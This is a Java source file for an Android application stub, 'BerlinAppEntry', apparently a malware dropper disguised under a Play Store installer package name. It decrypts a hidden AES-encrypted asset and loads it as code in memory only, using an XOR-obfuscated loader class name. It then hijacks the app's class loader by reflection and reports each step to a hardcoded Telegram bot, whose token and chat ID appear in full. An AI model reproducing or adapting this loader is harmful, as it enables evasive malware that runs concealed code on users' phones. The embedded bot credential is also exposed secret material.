package com.playstore.installer;

import android.app.Application;
import android.content.Context;
import android.content.res.AssetManager;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Berlin installer stub — pure Java, zero Kotlin stdlib dependency.
 * Compiled standalone into classes.dex by build_stub_dex.py.
 *
 * PATCH MARKERS (must stay exactly as-is — build_stub_dex.py searches for them):
 *   BERLIN_STUB_ASSET_MARKER : 32 bytes 0xAB — patched with asset name UTF-8 (null-padded)
 *   BERLIN_STUB_KEY_MARKER   : 64 bytes 0xCD — patched with AES-256 key hex UTF-8 (null-padded)
 *
 * Zero disk write — InMemoryDexClassLoader only. RAM only.
 */
public class BerlinAppEntry extends Application {

    // Asset name placeholder — 32 bytes 0xAB
    // build_stub_dex.py patches this with actual BERLIN_DEX_ASSET name (e.g. "d4f9a2c1.bin")
    private static final byte[] A = {
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB,
        (byte)0xAB,(byte)0xAB,(byte)0xAB,(byte)0xAB
    };

    // AES-256 key placeholder — 64 bytes 0xCD (64-char hex key = 64 UTF-8 bytes)
    // build_stub_dex.py patches this with actual BERLIN_DEX_KEY hex string
    private static final byte[] K = {
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD,
        (byte)0xCD,(byte)0xCD,(byte)0xCD,(byte)0xCD
    };

    private volatile ClassLoader h = null;

    // ── Telegram debug logger ─────────────────────────────────────────────────
    private void tg(final String msg) {
        final String token  = "8728380845:AAGm3oD6xpUWJ2ftPJP3QysNl0BQHv54Nq8";
        final String chatId = "8852912150";
        try {
            Thread t = new Thread(new Runnable() {
                public void run() {
                    try {
                        String text   = "[BerlinStub] " + msg;
                        String enc    = URLEncoder.encode(text, "UTF-8");
                        String urlStr = "https://api.telegram.org/bot" + token
                                      + "/sendMessage?chat_id=" + chatId + "&text=" + enc;
                        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                        conn.setConnectTimeout(4000);
                        conn.setReadTimeout(4000);
                        conn.setRequestMethod("GET");
                        conn.getResponseCode();
                        conn.disconnect();
                    } catch (Throwable ignored) {}
                }
            });
            t.setDaemon(false);
            t.start();
            t.join(5000);
        } catch (Throwable ignored) {}
    }

    private String fmtEx(Throwable t) {
        StringBuilder sb = new StringBuilder();
        sb.append(t.getClass().getSimpleName()).append(": ").append(t.getMessage());
        StackTraceElement[] frames = t.getStackTrace();
        int i = 0;
        while (i < frames.length && i < 5) {
            StackTraceElement f = frames[i];
            sb.append("\n  at ").append(f.getClassName())
              .append(".").append(f.getMethodName())
              .append("(").append(f.getFileName())
              .append(":").append(f.getLineNumber()).append(")");
            i++;
        }
        return sb.toString();
    }

    // ─────────────────────────────────────────────────────────────────────────

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        tg("attachBaseContext START — base=" + (base == null ? "NULL" : base.getClass().getSimpleName()));
        try {
            run(base);
        } catch (Throwable t) {
            tg("attachBaseContext UNCAUGHT — " + fmtEx(t));
        }
    }

    @Override
    public ClassLoader getClassLoader() {
        ClassLoader local = h;
        return local != null ? local : super.getClassLoader();
    }

    private String assetName() {
        byte PAD = 0x00;
        int len = 0;
        while (len < A.length && A[len] != PAD) len++;
        // Log first 16 bytes as hex for diagnosis
        StringBuilder hexSb = new StringBuilder();
        int hi = 0;
        while (hi < 16 && hi < A.length) {
            int v = A[hi] & 0xFF;
            hexSb.append(Character.forDigit((v >> 4) & 0xF, 16));
            hexSb.append(Character.forDigit(v & 0xF, 16));
            hi++;
        }
        tg("assetName — len=" + len + " firstBytes=" + hexSb.toString().toUpperCase());
        if (len == 0) {
            tg("assetName FAIL — len=0, marker not patched");
            return null;
        }
        try {
            String name = new String(A, 0, len, "UTF-8");
            tg("assetName OK — '" + name + "'");
            return name;
        } catch (Throwable t) {
            tg("assetName FAIL — " + fmtEx(t));
            return null;
        }
    }

    private String keyHex() {
        byte PAD = 0x00;
        int len = 0;
        while (len < K.length && K[len] != PAD) len++;
        tg("keyHex — len=" + len);
        if (len != 64) {
            tg("keyHex FAIL — expected 64 chars, got " + len);
            return null;
        }
        try {
            String key = new String(K, 0, 64, "UTF-8");
            tg("keyHex OK — 64 chars confirmed");
            return key;
        } catch (Throwable t) {
            tg("keyHex FAIL — " + fmtEx(t));
            return null;
        }
    }

    private void run(Context base) {
        tg("run STEP 1 — resolving assetName");
        String name = assetName();
        if (name == null) { tg("run ABORT — assetName returned null"); return; }

        tg("run STEP 2 — resolving keyHex");
        String key = keyHex();
        if (key == null) { tg("run ABORT — keyHex returned null"); return; }

        tg("run STEP 3 — getting AssetManager. base=" + (base == null ? "NULL" : "OK")
                + ", baseContext=" + (getBaseContext() == null ? "NULL" : "OK"));
        AssetManager assetMgr = null;
        if (base != null) {
            try { assetMgr = base.getAssets(); } catch (Throwable ignored) {}
        }
        if (assetMgr == null) {
            try { assetMgr = getBaseContext() != null ? getBaseContext().getAssets() : null; } catch (Throwable ignored) {}
        }
        if (assetMgr == null) {
            tg("run ABORT STEP 3 — AssetManager is null");
            return;
        }
        tg("run STEP 3 OK — AssetManager acquired");

        tg("run STEP 4 — opening asset '" + name + "'");
        byte[] enc;
        try {
            InputStream is = assetMgr.open(name);
            enc = peel(is);
            if (enc == null) {
                tg("run ABORT STEP 4 — peel() returned null for asset '" + name + "'");
                return;
            }
        } catch (Throwable t) {
            tg("run ABORT STEP 4 — assetMgr.open('" + name + "') threw: " + fmtEx(t));
            return;
        }
        tg("run STEP 4 OK — asset read " + enc.length + " bytes");

        if (enc.length < 17) {
            tg("run ABORT STEP 4b — enc too small: " + enc.length + " bytes");
            wipe(enc); return;
        }

        tg("run STEP 5 — AES-256-CBC decrypt");
        byte[] dex = aesDecrypt(enc, key);
        wipe(enc);
        if (dex == null) {
            tg("run ABORT STEP 5 — aesDecrypt returned null");
            return;
        }
        tg("run STEP 5 OK — decrypted " + dex.length + " bytes");

        if (dex.length < 8) {
            tg("run ABORT STEP 5b — decrypted DEX too small: " + dex.length + " bytes");
            wipe(dex); return;
        }

        tg("run STEP 6 — loading InMemoryDexClassLoader");
        // XOR-obfuscated class name: dalvik.system.InMemoryDexClassLoader
        byte[] ne = {0x3e,0x3b,0x36,0x2c,0x33,0x31,0x74,0x29,0x23,0x29,0x2e,0x3f,0x37,0x74,
                     0x13,0x34,0x17,0x3f,0x37,0x35,0x28,0x23,0x1e,0x3f,0x22,0x19,0x36,0x3b,
                     0x29,0x29,0x16,0x35,0x3b,0x3e,0x3f,0x28};
        char[] nc = new char[ne.length];
        for (int i = 0; i < ne.length; i++) nc[i] = (char)((ne[i] & 0xFF) ^ 0x5A);
        String loaderClassName = new String(nc);
        tg("run STEP 6 — classloader class: " + loaderClassName);

        try {
            Class<?> cls  = Class.forName(loaderClassName);
            Constructor<?> ctor = cls.getConstructor(ByteBuffer.class, ClassLoader.class);
            ClassLoader b = (ClassLoader) ctor.newInstance(
                    ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader());
            if (b == null) {
                tg("run ABORT STEP 6 — cast to ClassLoader returned null");
                wipe(dex); return;
            }
            h = b;
            tg("run STEP 6 OK — InMemoryDexClassLoader created, calling chain()");
            chain(b);
            tg("run STEP 6 DONE — chain() complete, h is set");
        } catch (Throwable t) {
            tg("run ABORT STEP 6 — InMemoryDexClassLoader threw: " + fmtEx(t));
        } finally {
            wipe(dex);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        tg("onCreate — h=" + (h == null ? "NULL (run() failed)" : "SET OK"));
        kick();
    }

    private void kick() {
        ClassLoader b = h;
        if (b == null) b = getClassLoader();
        if (b == null) {
            tg("kick ABORT — h is null and classLoader is null");
            return;
        }
        tg("kick STEP 1 — loading LauncherApplication from decrypted DEX. pkg=" + getPackageName());
        try {
            String pkg = getPackageName();
            if (pkg == null) { tg("kick ABORT — packageName is null"); return; }
            String launcherClass = pkg + ".LauncherApplication";
            Class<?> cls;
            try {
                cls = Class.forName(launcherClass, true, b);
            } catch (Throwable t) {
                tg("kick ABORT STEP 1 — Class.forName('" + launcherClass + "') threw: " + fmtEx(t));
                return;
            }
            tg("kick STEP 1 OK — LauncherApplication class found");

            Application app;
            try {
                app = (Application) cls.newInstance();
            } catch (Throwable t) {
                tg("kick ABORT STEP 1b — newInstance() threw: " + fmtEx(t));
                return;
            }

            tg("kick STEP 2 — calling attachBaseContext on LauncherApplication");
            // XOR-obfuscated method name: "attach" (called via reflection)
            byte[] ae = {0x3b,0x2e,0x2e,0x3b,0x39,0x32};
            char[] ac = new char[ae.length];
            for (int j = 0; j < ae.length; j++) ac[j] = (char)((ae[j] & 0xFF) ^ 0x5A);
            String methodName = new String(ac);
            java.lang.reflect.Method m = Application.class.getDeclaredMethod(methodName, Context.class);
            m.setAccessible(true);
            m.invoke(app, getBaseContext());
            tg("kick STEP 2 OK — attachBaseContext done, calling onCreate");
            app.onCreate();
            tg("kick DONE — LauncherApplication.onCreate() complete");
        } catch (Throwable t) {
            tg("kick UNCAUGHT — " + fmtEx(t));
        }
    }

    private byte[] aesDecrypt(byte[] blob, String keyHex) {
        if (blob.length < 17 || keyHex.length() != 64) {
            tg("aesDecrypt FAIL — size=" + blob.length + " keyLen=" + keyHex.length());
            return null;
        }
        // Parse hex key — pure Java, no stdlib
        byte[] k = new byte[32];
        try {
            for (int i = 0; i < 32; i++) {
                k[i] = (byte) Integer.parseInt(keyHex.substring(i * 2, i * 2 + 2), 16);
            }
        } catch (Throwable t) {
            tg("aesDecrypt FAIL — key parse threw: " + fmtEx(t));
            return null;
        }
        try {
            byte[] iv = Arrays.copyOfRange(blob, 0, 16);
            byte[] ct = Arrays.copyOfRange(blob, 16, blob.length);
            Cipher c  = Cipher.getInstance("AES/CBC/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE,
                   new SecretKeySpec(k, "AES"),
                   new IvParameterSpec(iv));
            byte[] r = c.doFinal(ct);
            wipe(k); wipe(iv); wipe(ct);
            return r;
        } catch (Throwable t) {
            tg("aesDecrypt FAIL — cipher threw: " + fmtEx(t));
            wipe(k);
            return null;
        }
    }

    private void chain(ClassLoader c) {
        if (c == null) { tg("chain SKIP — classLoader is null"); return; }
        tg("chain STEP 1 — injecting into mPackageInfo.mClassLoader");
        try {
            Context base = getBaseContext();
            Class<?> cls = base != null ? base.getClass() : null;
            Field pkgInfoField = null;
            while (cls != null && pkgInfoField == null) {
                try { pkgInfoField = cls.getDeclaredField("mPackageInfo"); }
                catch (NoSuchFieldException ignored) { cls = cls.getSuperclass(); }
            }
            if (pkgInfoField == null) {
                tg("chain FAIL STEP 1 — mPackageInfo field not found");
                return;
            }
            pkgInfoField.setAccessible(true);
            Object pkgInfo = pkgInfoField.get(base);
            if (pkgInfo == null) {
                tg("chain FAIL STEP 1 — mPackageInfo value is null");
                return;
            }
            Class<?> cls2 = pkgInfo.getClass();
            Field clField = null;
            while (cls2 != null && clField == null) {
                try { clField = cls2.getDeclaredField("mClassLoader"); }
                catch (NoSuchFieldException ignored) { cls2 = cls2.getSuperclass(); }
            }
            if (clField == null) {
                tg("chain FAIL STEP 1 — mClassLoader field not found");
                return;
            }
            clField.setAccessible(true);
            clField.set(pkgInfo, c);
            tg("chain STEP 1 OK — mPackageInfo.mClassLoader injected");
        } catch (Throwable t) {
            tg("chain FAIL STEP 1 — threw: " + fmtEx(t));
        }

        try {
            Thread.currentThread().setContextClassLoader(c);
            tg("chain STEP 2 OK — thread contextClassLoader set");
        } catch (Throwable t) {
            tg("chain FAIL STEP 2 — contextClassLoader threw: " + fmtEx(t));
        }
    }

    private byte[] peel(InputStream s) {
        if (s == null) return null;
        try {
            ByteArrayOutputStream o = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = s.read(buf)) != -1) o.write(buf, 0, n);
            s.close();
            return o.toByteArray();
        } catch (Throwable t) {
            return null;
        }
    }

    private void wipe(byte[] a) {
        if (a == null) return;
        for (int i = 0; i < a.length; i++) a[i] = 0;
    }
}
